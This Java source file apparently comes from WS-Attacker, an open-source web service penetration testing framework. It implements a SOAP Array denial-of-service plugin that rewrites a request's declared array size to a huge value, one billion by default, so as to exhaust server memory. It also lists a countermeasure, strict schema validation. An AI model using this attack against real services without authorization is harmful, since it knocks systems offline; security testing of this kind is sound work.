/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos;


import org.apache.xmlbeans.XmlException;
import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.xml.sax.SAXException;

import wsattacker.main.composition.plugin.AbstractPlugin;
import wsattacker.main.composition.plugin.option.AbstractOption;
import wsattacker.main.composition.plugin.option.AbstractOptionBoolean;
import wsattacker.main.composition.plugin.option.AbstractOptionChoice;
import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
import wsattacker.main.composition.plugin.option.AbstractOptionVarchar;
import wsattacker.main.composition.testsuite.RequestResponsePair;
import wsattacker.main.plugin.PluginState;
import wsattacker.main.plugin.option.OptionLimitedInteger;
import wsattacker.main.plugin.option.OptionSimpleBoolean;
import wsattacker.main.plugin.option.OptionSimpleVarchar;
import wsattacker.main.testsuite.TestSuite;
import wsattacker.util.SoapUtilities;
import wsattacker.util.SortedUniqueList;

import com.eviware.soapui.impl.wsdl.WsdlInterface;
import com.eviware.soapui.impl.wsdl.WsdlOperation;
import com.eviware.soapui.impl.wsdl.WsdlRequest;
import com.eviware.soapui.impl.wsdl.WsdlSubmit;
import com.eviware.soapui.impl.wsdl.WsdlSubmitContext;
import com.eviware.soapui.impl.wsdl.support.soap.SoapUtils;
import com.eviware.soapui.model.iface.Operation;
import com.eviware.soapui.model.iface.Request.SubmitException;
import com.eviware.soapui.model.iface.Response;
import com.eviware.soapui.support.types.StringToStringMap;
import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;

import wsattacker.plugin.dos.dosExtension.mvc.AttackMVC;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathConstants;
import javax.xml.xpath.XPathExpressionException;
import javax.xml.xpath.XPathFactory;
import org.w3c.dom.Element;
import wsattacker.main.composition.plugin.PluginFunctionInterface;
import wsattacker.main.plugin.option.OptionSimpleText;
import wsattacker.plugin.dos.dosExtension.attackClasses.hashDos.CollisionDJBX31A;
import wsattacker.plugin.dos.dosExtension.attackClasses.hashDos.CollisionDJBX33A;
import wsattacker.plugin.dos.dosExtension.function.postanalyze.DOSPostAnalyzeFunction;
import wsattacker.plugin.dos.dosExtension.mvc.model.AttackModel;
import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;
import wsattacker.plugin.dos.dosExtension.util.UtilDos;

public class SoapArrayAttack extends AbstractDosPlugin {
	

    // Mandatory DOS-specific Attributes - Do NOT change!
    // <editor-fold defaultstate="collapsed" desc="Autogenerated Attributes">

    private static final long serialVersionUID = 1L;
    // </editor-fold>

    // Custom Attributes
    private AbstractOptionInteger optionNumberArrayElements;
		

    @Override 
    public void initializeDosPlugin() {

	// Custom Initilisation
	optionNumberArrayElements =  new OptionLimitedInteger("Param 8", 1000000000, "Number of SOAP array elements to be created", 1, 2000000000);	
	getPluginOptions().add(optionNumberArrayElements);

    }	

    @Override 
    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition(){
	return OptionTextAreaSoapMessage.PayloadPosition.NONE;
    }  	    
    
    @Override
    public String getName() {
	    return "SOAP Array Attack";
    }

    @Override
    public String getDescription() {
	    return "This attack checks whether or not a Web service is vulnerable to the \"Soap Array\" attack. "
		    + "In order for this attack to work the attacked Web service has to excpect a SOAP array.\n"
		    + "Otherwise any SOAP array will be ignored and the attack won't work.\n"
		    + "A detailed description of the attack can be found \n"
		    + "at WS-Attacks.org: http://clawslab.nds.rub.de/wiki/index.php/Soap_Array_Attack"
		    + "\n\n"
		    + "The attack algorithm will automatically search for any SOAP array and will \n"
		    + "change the array size to the value defined in parameter 8."
		    + "\n\n"
		    + "Parameter 8 defines the size of the array. The higher the array size, the higher the allocated memory.\n"
		    + "One Billion array elements is the default value\n"
		    + "\n\n";
    }

    @Override
    public String getCountermeasures(){
      return "In order to counter the attack, strict schema validation has to be performed that limits the array size. "
	      + "See http://clawslab.nds.rub.de/wiki/index.php/Soap_Array_Attack for more detailed countermeasures.";
    }        

    @Override
    public String getAuthor() {
	    return "Andreas Falkenberg";
    }

    @Override
    public String getVersion() {
	    return "1.0 / 2012-10-22";
    }
    
    @Override
    public boolean attackPrecheck(){
	// Try to find soapArray in SoapMessage
	String regex1 = "arrayType=\"[A-Za-z0-9:_-]*\\x5B";
	Pattern p1 = Pattern.compile(regex1); // Compiles regular expression into Pattern.
	Matcher m1 = p1.matcher(this.getOriginalRequest().getRequestContent()); // Creates Matcher with subject s and Pattern p. 
	if(m1.find()){
	    setAttackPrecheck(true);
	    return true;
	}else{
	    setAttackPrecheck(false);
	    return false;
	}
    }

    @Override
    public void createTamperedRequest(){

	String stringSOAPMessage = this.getOptionTextAreaSoapMessage().getValue();

	// Try to find soapArray in SoapMessage
	String regex1 = "arrayType=\"[A-Za-z0-9:_-]*\\x5B";
	Pattern p1 = Pattern.compile(regex1); // Compiles regular expression into Pattern.
	Matcher m1 = p1.matcher(stringSOAPMessage); // Creates Matcher with subject s and Pattern p. 
	if(m1.find()){
	    // get first part of Message
	    int lengthFirstpart = m1.end();
	    String firstPart = stringSOAPMessage.substring(0, lengthFirstpart); 

	    // get last part of message and remove previous array length
	    String lastPart = stringSOAPMessage.substring(lengthFirstpart, stringSOAPMessage.length()); ;
	    String regex2 = "^[0-9]*\\x5D";
	    Pattern p2 = Pattern.compile(regex2);
	    Matcher m2 = p2.matcher(lastPart);
	    if(m2.find()){
		lastPart = m2.replaceFirst("]");
	    }else{
		setAttackPrecheck(false);
	    }

	    // Build new Message via Stringbuilder - set Arraywidth to desired number! 
	    StringBuilder sb = new StringBuilder();
	    sb.append(firstPart);
	    sb.append(optionNumberArrayElements.getValue());
	    sb.append(lastPart);

	    // get HeaderFields from original request, if required add custom headers - make sure to clone!
	    Map<String, String> httpHeaderMap = new HashMap<String, String>();
	    for (Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet()) {
		httpHeaderMap.put(entry.getKey(), entry.getValue());
	    }		        
	    
	    // write payload and header to TamperedRequestObject
	    this.setTamperedRequestObject(httpHeaderMap, getOriginalRequest().getEndpoint(), sb.toString());
	}else{
	    // get HeaderFields from original request, if required add custom headers
	    // write payload and header to TamperedRequestObject
	    Map<String, String> httpHeaderMap = getOriginalRequestHeaderFields();	        
	    this.setTamperedRequestObject(httpHeaderMap, getOriginalRequest().getEndpoint(), stringSOAPMessage);	    
	    // Nothing found, attack will end right here!
	    setAttackPrecheck(false);
	}	    
    }


    // ----------------------------------------------------------
    // All custom DOS-Attack specific Methods below! 
    // ----------------------------------------------------------

}
